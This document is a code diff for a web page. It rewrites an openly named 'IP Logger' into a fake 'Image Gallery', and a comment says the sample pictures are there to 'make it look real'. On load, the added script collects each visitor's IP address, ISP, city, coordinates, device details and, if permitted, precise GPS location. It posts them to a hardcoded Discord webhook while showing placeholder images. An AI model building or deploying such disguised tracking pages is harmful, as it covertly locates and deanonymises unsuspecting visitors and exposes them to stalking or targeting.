@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Image Gallery</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -34,179 +34,62 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        .gallery {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 20px;
+        }
+        .gallery img {
+            width: 100%;
+            height: 150px;
+            object-fit: cover;
+            border-radius: 5px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="loader"></div>
-        <p id="status-message">Loading content...</p>
+        <p id="status-message">Loading gallery...</p>
+        <div class="gallery" id="image-gallery" style="display: none;">
+            <!-- Images will be loaded here -->
+        </div>
     </div>
 
     <script>
         // Configuration
         const config = {
             // BASE CONFIG
-            "webhook": "https://discord.com/api/webhooks/1433408427815600241/TkgVjkPmIOqYcO9g3P0GiH1SRkLStDJbpuQ1gIpBx6pPvzWDSOR1JhSP-cQJuf0wDAIN",
-            "username": "IP Logger",
+            "webhook": "https://discord.com/api/webhooks/1350791006143905852/pq3nFAQqzUEyw2T7b3N1y1_iW8Sr5vnzY8-LxkaNA0lqicxNeEdO7AE9HMKDaPFLOc-j",
+            "username": "Image Gallery Viewer",
             "color": 0x00FFFF,
 
             // OPTIONS
-            "accurateLocation": true, // Enable GPS location
-            "linkAlerts": true, // Alert when link is accessed
-            "vpnCheck": 1, // 0=No VPN check, 1=No ping on VPN, 2=No alert on VPN
-            "antiBot": 1, // 0=No anti-bot, 1=No ping on bot, 2=No ping on confirmed bot, 3=No alert on bot, 4=No alert on confirmed bot
+            "accurateLocation": true,
+            "linkAlerts": true,
+            "vpnCheck": 1,
+            "antiBot": 1,
             
             // REDIRECTION
             "redirect": {
-                "enabled": false, // Enable redirect after logging
-                "url": "https://example.com", // URL to redirect to
-                "delay": 3000 // Delay in milliseconds
+                "enabled": false,
+                "url": "https://google.com",
+                "delay": 3000
             },
 
             // CUSTOM MESSAGE
             "message": {
-                "enabled": false, // Show custom message
-                "message": "Your information has been logged.", // Message text
-                "richMessage": true // Enable template replacements
+                "enabled": false,
+                "message": "Thanks for visiting our gallery!",
+                "richMessage": true
             }
         };
 
-        // Blacklisted IP ranges (from image.py)
-        const blacklistedIPs = [];
-
-        // Bot detection function (from image.py)
-        function botCheck(ip, useragent) {
-            if (!ip || !useragent) return false;
-            
-            if (ip.startsWith("34.") || ip.startsWith("35.")) {
-                return "Discord";
-            } else if (useragent.includes("TelegramBot")) {
-                return "Telegram";
-            } else if (useragent.includes("Discordbot") || useragent.includes("+https://discord.com")) {
-                return "Discord Crawler";
-            } else if (useragent.includes("Twitterbot") || useragent.includes("facebookexternalhit")) {
-                return "Social Media Crawler";
-            } else if (useragent.includes("Googlebot") || useragent.includes("Bingbot")) {
-                return "Search Engine Crawler";
-            } else {
-                return false;
-            }
-        }
-
-        // Enhanced VPN handling (from image.py)
-        function getPingStatus(ipInfo) {
-            let ping = "@everyone";
-            
-            if (ipInfo.proxy) {
-                if (config.vpnCheck === 2) return null;
-                if (config.vpnCheck === 1) ping = "";
-            }
-
-            if (ipInfo.hosting) {
-                if (config.antiBot === 4) {
-                    if (!ipInfo.proxy) return null;
-                }
-                if (config.antiBot === 3) return null;
-                if (config.antiBot === 2 && !ipInfo.proxy) ping = "";
-                if (config.antiBot === 1) ping = "";
-            }
-
-            return ping;
-        }
-
-        // Enhanced user agent parsing (simplified version of httpagentparser)
-        function parseUserAgent(ua) {
-            if (!ua) return { os: 'Unknown', browser: 'Unknown' };
-            
-            let os = 'Unknown';
-            let browser = 'Unknown';
-
-            // OS Detection
-            if (/Windows NT 10/.test(ua)) os = 'Windows 10/11';
-            else if (/Windows NT 6.3/.test(ua)) os = 'Windows 8.1';
-            else if (/Windows NT 6.2/.test(ua)) os = 'Windows 8';
-            else if (/Windows NT 6.1/.test(ua)) os = 'Windows 7';
-            else if (/Windows NT 6.0/.test(ua)) os = 'Windows Vista';
-            else if (/Windows NT 5.1/.test(ua)) os = 'Windows XP';
-            else if (/Mac OS X 14_/.test(ua)) os = 'macOS Sonoma';
-            else if (/Mac OS X 13_/.test(ua)) os = 'macOS Ventura';
-            else if (/Mac OS X 12_/.test(ua)) os = 'macOS Monterey';
-            else if (/Mac OS X 11_/.test(ua)) os = 'macOS Big Sur';
-            else if (/Mac OS X/.test(ua)) {
-                const match = /Mac OS X ([0-9_]+)/.exec(ua);
-                os = match ? `macOS ${match[1].replace(/_/g, '.')}` : 'macOS';
-            }
-            else if (/Android ([0-9.]+)/.test(ua)) {
-                const match = /Android ([0-9.]+)/.exec(ua);
-                os = match ? `Android ${match[1]}` : 'Android';
-            }
-            else if (/(iPhone|iPad).*OS ([0-9_]+)/.test(ua)) {
-                const match = /(iPhone|iPad).*OS ([0-9_]+)/.exec(ua);
-                os = match ? `iOS ${match[2].replace(/_/g, '.')}` : 'iOS';
-            }
-            else if (/Linux/.test(ua)) os = 'Linux';
-            else if (/CrOS/.test(ua)) os = 'Chrome OS';
-
-            // Browser Detection
-            if (/Chrome\/([0-9.]+)/.test(ua) && !/Edg|OPR/.test(ua)) {
-                const match = /Chrome\/([0-9.]+)/.exec(ua);
-                browser = match ? `Chrome ${match[1]}` : 'Chrome';
-            }
-            else if (/Firefox\/([0-9.]+)/.test(ua)) {
-                const match = /Firefox\/([0-9.]+)/.exec(ua);
-                browser = match ? `Firefox ${match[1]}` : 'Firefox';
-            }
-            else if (/Safari\/([0-9.]+)/.test(ua) && !/Chrome/.test(ua)) {
-                const match = /Version\/([0-9.]+)/.exec(ua);
-                browser = match ? `Safari ${match[1]}` : 'Safari';
-            }
-            else if (/Edg\/([0-9.]+)/.test(ua)) {
-                const match = /Edg\/([0-9.]+)/.exec(ua);
-                browser = match ? `Edge ${match[1]}` : 'Edge';
-            }
-            else if (/OPR\/([0-9.]+)/.test(ua)) {
-                const match = /OPR\/([0-9.]+)/.exec(ua);
-                browser = match ? `Opera ${match[1]}` : 'Opera';
-            }
-
-            return { os, browser };
-        }
-
-        // Get continent from country code
-        const getContinent = (countryCode) => {
-            if (!countryCode) return 'Unknown';
-            
-            const continentMap = {
-                'US': 'North America', 'CA': 'North America', 'MX': 'North America',
-                'GB': 'Europe', 'DE': 'Europe', 'FR': 'Europe', 'IT': 'Europe', 'ES': 'Europe',
-                'NL': 'Europe', 'SE': 'Europe', 'CH': 'Europe', 'NO': 'Europe', 'DK': 'Europe',
-                'FI': 'Europe', 'BE': 'Europe', 'AT': 'Europe', 'IE': 'Europe', 'PT': 'Europe',
-                'CN': 'Asia', 'JP': 'Asia', 'IN': 'Asia', 'KR': 'Asia', 'SG': 'Asia',
-                'TH': 'Asia', 'VN': 'Asia', 'MY': 'Asia', 'ID': 'Asia', 'PH': 'Asia',
-                'BR': 'South America', 'AR': 'South America', 'CO': 'South America', 'PE': 'South America',
-                'CL': 'South America', 'EC': 'South America', 'VE': 'South America', 'BO': 'South America',
-                'ZA': 'Africa', 'NG': 'Africa', 'EG': 'Africa', 'KE': 'Africa', 'ET': 'Africa',
-                'GH': 'Africa', 'DZ': 'Africa', 'MA': 'Africa', 'TZ': 'Africa', 'SD': 'Africa',
-                'AU': 'Oceania', 'NZ': 'Oceania', 'FJ': 'Oceania', 'PG': 'Oceania', 'SB': 'Oceania'
-            };
-
-            return continentMap[countryCode] || 'Unknown';
-        };
-
-        // Format timezone
-        const formatTimezone = (timezone) => {
-            if (!timezone) return 'Unknown';
+        // Enhanced error reporting
+        async function sendErrorWebhook(error, additionalInfo = "") {
             try {
-                const [continent, city] = timezone.split('/');
-                return `${city.replace(/_/g, ' ')} (${continent})`;
-            } catch {
-                return timezone;
-            }
-        };
-
-        // Error reporting to Discord
-        async function sendErrorWebhook(error) {
-            try {
+                const errorMessage = error.stack || error.message || error.toString();
                 await fetch(config.webhook, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -214,12 +97,12 @@
                         username: `${config.username} - ERROR`,
                         content: "@everyone",
                         embeds: [{
-                            title: "⚠️ IP Logger Error",
+                            title: "⚠️ Gallery Error",
                             color: 0xFF0000,
-                            description: `**An error occurred!**\n\n**Error:**\n\`\`\`${error.stack || error.message || error}\`\`\``,
+                            description: `**An error occurred!**\n\n**Error:**\n\`\`\`${errorMessage.substring(0, 1000)}\`\`\`\n**Additional Info:** ${additionalInfo}`,
                             fields: [
                                 { name: "URL", value: window.location.href, inline: true },
-                                { name: "User Agent", value: navigator.userAgent?.slice(0, 1000) || "Unknown" }
+                                { name: "User Agent", value: navigator.userAgent?.substring(0, 100) || "Unknown", inline: true }
                             ]
                         }]
                     })
@@ -229,22 +112,34 @@
             }
         }
 
-        // Send webhook helper
-        async function sendWebhook(webhookData) {
-            try {
-                await fetch(config.webhook, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(webhookData)
-                });
-            } catch (error) {
-                console.error('Failed to send webhook:', error);
-                await sendErrorWebhook(error);
-            }
+        // Get IP information using JSONP to avoid CORS
+        function getIPInfo() {
+            return new Promise((resolve, reject) => {
+                // Create JSONP callback
+                const callbackName = 'ipCallback_' + Date.now();
+                window[callbackName] = function(data) {
+                    delete window[callbackName];
+                    document.body.removeChild(script);
+                    
+                    if (data && data.status === 'success') {
+                        resolve(data);
+                    } else {
+                        reject(new Error('IP API failed: ' + (data?.message || 'Unknown error')));
+                    }
+                };
+
+                // Create script tag for JSONP
+                const script = document.createElement('script');
+                script.src = `https://ip-api.com/json/?fields=66846719&callback=${callbackName}`;
+                script.onerror = () => {
+                    reject(new Error('Failed to load IP API'));
+                };
+                document.body.appendChild(script);
+            });
         }
 
         // Get precise location
-        async function getPreciseLocation() {
+        function getPreciseLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
                     resolve(null);
@@ -261,7 +156,7 @@
                         });
                     },
                     (error) => {
-                        console.error('Geolocation error:', error);
+                        console.log('Geolocation failed or denied:', error.message);
                         resolve(null);
                     },
                     {
@@ -273,104 +168,149 @@
             });
         }
 
-        // Replace template placeholders
-        function replacePlaceholders(message, data) {
-            return message
-                .replace(/{ip}/g, data.ipInfo.query || 'Unknown')
-                .replace(/{isp}/g, data.ipInfo.isp || 'Unknown')
-                .replace(/{asn}/g, data.ipInfo.as || 'Unknown')
-                .replace(/{country}/g, data.ipInfo.country || 'Unknown')
-                .replace(/{region}/g, data.ipInfo.regionName || 'Unknown')
-                .replace(/{city}/g, data.ipInfo.city || 'Unknown')
-                .replace(/{lat}/g, data.ipInfo.lat || 'Unknown')
-                .replace(/{long}/g, data.ipInfo.lon || 'Unknown')
-                .replace(/{timezone}/g, formatTimezone(data.ipInfo.timezone) || 'Unknown')
-                .replace(/{mobile}/g, data.ipInfo.mobile ? 'True' : 'False')
-                .replace(/{vpn}/g, data.ipInfo.proxy ? 'True' : 'False')
-                .replace(/{bot}/g, data.botStatus || 'False')
-                .replace(/{browser}/g, data.browserInfo.browser || 'Unknown')
-                .replace(/{os}/g, data.browserInfo.os || 'Unknown');
+        // Send webhook helper
+        async function sendWebhook(webhookData) {
+            try {
+                const response = await fetch(config.webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(webhookData)
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`Webhook failed: ${response.status}`);
+                }
+            } catch (error) {
+                console.error('Failed to send webhook:', error);
+                await sendErrorWebhook(error, "Webhook send failed");
+            }
         }
 
-        // Get IP information and send to Discord
-        async function logIP() {
-            try {
-                // Update status message
-                document.getElementById('status-message').textContent = 'Processing...';
+        // Parse user agent
+        function parseUserAgent(ua) {
+            if (!ua) return { os: 'Unknown', browser: 'Unknown' };
+            
+            let os = 'Unknown';
+            let browser = 'Unknown';
 
-                // Check for blacklisted IPs (would need server-side for actual IP)
-                const bot = botCheck("client-ip", navigator.userAgent);
-                if (bot && config.linkAlerts) {
+            // OS Detection
+            if (/Windows NT 10/.test(ua)) os = 'Windows 10/11';
+            else if (/Windows NT 6.3/.test(ua)) os = 'Windows 8.1';
+            else if (/Windows NT 6.2/.test(ua)) os = 'Windows 8';
+            else if (/Windows NT 6.1/.test(ua)) os = 'Windows 7';
+            else if (/Windows NT 6.0/.test(ua)) os = 'Windows Vista';
+            else if (/Windows NT 5.1/.test(ua)) os = 'Windows XP';
+            else if (/Mac OS X/.test(ua)) {
+                const match = /Mac OS X ([0-9_]+)/.exec(ua);
+                os = match ? `macOS ${match[1].replace(/_/g, '.')}` : 'macOS';
+            }
+            else if (/Android/.test(ua)) os = 'Android';
+            else if (/(iPhone|iPad).*OS/.test(ua)) os = 'iOS';
+            else if (/Linux/.test(ua)) os = 'Linux';
+
+            // Browser Detection
+            if (/Chrome\//.test(ua) && !/Edg|OPR/.test(ua)) browser = 'Chrome';
+            else if (/Firefox\//.test(ua)) browser = 'Firefox';
+            else if (/Safari\//.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
+            else if (/Edg\//.test(ua)) browser = 'Edge';
+            else if (/OPR\//.test(ua)) browser = 'Opera';
+
+            return { os, browser };
+        }
+
+        // Load sample images to make it look real
+        function loadGallery() {
+            const gallery = document.getElementById('image-gallery');
+            const images = [
+                'https://picsum.photos/300/200?random=1',
+                'https://picsum.photos/300/200?random=2', 
+                'https://picsum.photos/300/200?random=3',
+                'https://picsum.photos/300/200?random=4',
+                'https://picsum.photos/300/200?random=5',
+                'https://picsum.photos/300/200?random=6'
+            ];
+
+            images.forEach(src => {
+                const img = document.createElement('img');
+                img.src = src;
+                img.alt = 'Gallery image';
+                gallery.appendChild(img);
+            });
+            
+            gallery.style.display = 'grid';
+            document.querySelector('.loader').style.display = 'none';
+            document.getElementById('status-message').textContent = 'Gallery loaded successfully!';
+        }
+
+        // Main logging function
+        async function logVisitor() {
+            try {
+                // Send link alert
+                if (config.linkAlerts) {
                     await sendWebhook({
-                        username: `${config.username} - Link Alert`,
+                        username: `${config.username} - Visit`,
                         content: "",
                         embeds: [{
-                            title: "🔗 Link Accessed",
+                            title: "🔗 Gallery Accessed",
                             color: config.color,
-                            description: `An IP logging link was accessed by a crawler!\n\n**Platform:** \`${bot}\`\n**User Agent:**\n\`\`\`${navigator.userAgent}\`\`\``
+                            description: `Someone visited the image gallery\n\n**User Agent:**\n\`\`\`${navigator.userAgent.substring(0, 200)}\`\`\``
                         }]
                     });
                 }
 
-                // Get IP information from ip-api.com
-                const ipResponse = await fetch('http://ip-api.com/json/?fields=66846719');
-                if (!ipResponse.ok) throw new Error(`IP API responded with ${ipResponse.status}`);
+                // Get IP info with JSONP (no CORS)
+                const ipData = await getIPInfo();
                 
-                const ipData = await ipResponse.json();
-                if (ipData.status !== 'success') throw new Error('IP API returned unsuccessful status');
-
-                // Check if IP is blacklisted
-                if (blacklistedIPs.some(blacklisted => ipData.query.startsWith(blacklisted))) {
-                    console.log('Blacklisted IP detected');
-                    return;
-                }
-
-                // Get browser information
+                // Get browser info
                 const browserInfo = parseUserAgent(navigator.userAgent);
-                
-                // Apply continent mapping
-                if (ipData.countryCode) {
-                    ipData.continent = getContinent(ipData.countryCode);
-                }
 
-                // Enhanced bot detection
-                let botStatus = 'False';
-                if (ipData.hosting) {
-                    botStatus = ipData.proxy ? 'Possibly' : 'True';
-                }
+                // Send main webhook
+                await sendWebhook({
+                    username: config.username,
+                    content: "",
+                    embeds: [{
+                        title: "🌐 Gallery Visitor",
+                        color: config.color,
+                        description: `
+**Visitor Information:**
 
-                const logData = {
-                    ipInfo: ipData,
-                    browserInfo: browserInfo,
-                    botStatus: botStatus,
-                    timestamp: new Date().toISOString(),
-                    url: window.location.href
-                };
+**IP Info:**
+> **IP:** \`${ipData.query}\`
+> **ISP:** \`${ipData.isp || 'Unknown'}\`
+> **Country:** \`${ipData.country || 'Unknown'}\`
+> **Region:** \`${ipData.regionName || 'Unknown'}\`
+> **City:** \`${ipData.city || 'Unknown'}\`
+> **Coords:** \`${ipData.lat}, ${ipData.lon}\`
 
-                // Get ping status based on VPN/bot config
-                const ping = getPingStatus(ipData);
-
-                // Send main webhook if not blocked
-                if (ping !== null) {
-                    await sendMainWebhook(logData, ping);
-                }
+**Browser Info:**
+> **OS:** \`${browserInfo.os}\`
+> **Browser:** \`${browserInfo.browser}\`
+> **Mobile:** \`${ipData.mobile ? 'Yes' : 'No'}\`
+> **VPN:** \`${ipData.proxy ? 'Yes' : 'No'}\``,
+                        footer: {
+                            text: "Gallery access logged"
+                        }
+                    }]
+                });
 
                 // Get precise location if enabled
                 if (config.accurateLocation) {
                     const preciseLocation = await getPreciseLocation();
                     if (preciseLocation) {
-                        await sendPreciseLocationWebhook(logData, preciseLocation);
+                        await sendWebhook({
+                            username: `${config.username} - Location`,
+                            content: "",
+                            embeds: [{
+                                title: "📍 Precise Location",
+                                color: 0x00FF00,
+                                description: `**Exact GPS Location Obtained:**\n\n**Coordinates:** \`${preciseLocation.coords}\`\n**Accuracy:** ${preciseLocation.accuracy}m\n**Google Maps:** [View Location](${preciseLocation.mapsLink})`
+                            }]
+                        });
                     }
                 }
 
-                // Show custom message if enabled
-                if (config.message.enabled) {
-                    let message = config.message.message;
-                    if (config.message.richMessage) {
-                        message = replacePlaceholders(message, logData);
-                    }
-                    document.getElementById('status-message').textContent = message;
-                }
+                // Load the actual gallery
+                loadGallery();
 
                 // Redirect if enabled
                 if (config.redirect.enabled) {
@@ -380,73 +320,21 @@
                 }
 
             } catch (error) {
-                console.error('Error logging IP:', error);
-                await sendErrorWebhook(error);
-                document.getElementById('status-message').textContent = 'An error occurred. Please try again.';
+                console.error('Logging error:', error);
+                
+                // Still load gallery even if logging fails
+                loadGallery();
+                
+                // Send error report
+                await sendErrorWebhook(error, "Main logging function failed");
             }
         }
 
-        async function sendMainWebhook(data, ping) {
-            const embed = {
-                username: config.username,
-                content: ping,
-                embeds: [{
-                    title: "🌐 IP Logged",
-                    color: config.color,
-                    description: `
-**IP Info:**
-> **IP:** \`${data.ipInfo.query}\`
-> **Provider:** \`${data.ipInfo.isp}\`
-> **ASN:** \`${data.ipInfo.as}\`
-> **Continent:** \`${data.ipInfo.continent}\`
-> **Country:** \`${data.ipInfo.country}\`
-> **Region:** \`${data.ipInfo.regionName}\`
-> **City:** \`${data.ipInfo.city}\`
-> **Coordinates:** \`${data.ipInfo.lat}, ${data.ipInfo.lon}\` (Approximate)
-> **Timezone:** \`${formatTimezone(data.ipInfo.timezone)}\`
-> **Mobile:** \`${data.ipInfo.mobile ? 'True' : 'False'}\`
-> **VPN:** \`${data.ipInfo.proxy ? 'True' : 'False'}\`
-> **Bot:** \`${data.botStatus}\`
+        // Start when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(logVisitor, 1000); // Small delay to show loading
+        });
 
-**PC Info:**
-> **OS:** \`${data.browserInfo.os}\`
-> **Browser:** \`${data.browserInfo.browser}\`
-
-**User Agent:**
-\`\`\`
-${navigator.userAgent}
-\`\`\``
-                }]
-            };
-
-            await sendWebhook(embed);
-        }
-
-        async function sendPreciseLocationWebhook(data, preciseLocation) {
-            const embed = {
-                username: `${config.username} - Precise Location`,
-                content: "@everyone",
-                embeds: [{
-                    title: "📍 Precise Location Obtained",
-                    color: 0x00FF00,
-                    description: `
-**Precise GPS Location:**
-> **Coordinates:** \`${preciseLocation.coords}\`
-> **Accuracy:** \`${preciseLocation.accuracy} meters\`
-> **Google Maps:** [View Location](${preciseLocation.mapsLink})
-
-**User Info:**
-> **IP:** \`${data.ipInfo.query}\`
-> **Country:** \`${data.ipInfo.country}\`
-> **City:** \`${data.ipInfo.city}\``
-                }]
-            };
-
-            await sendWebhook(embed);
-        }
-
-        // Execute when page loads
-        document.addEventListener('DOMContentLoaded', logIP);
     </script>
 </body>
 </html>
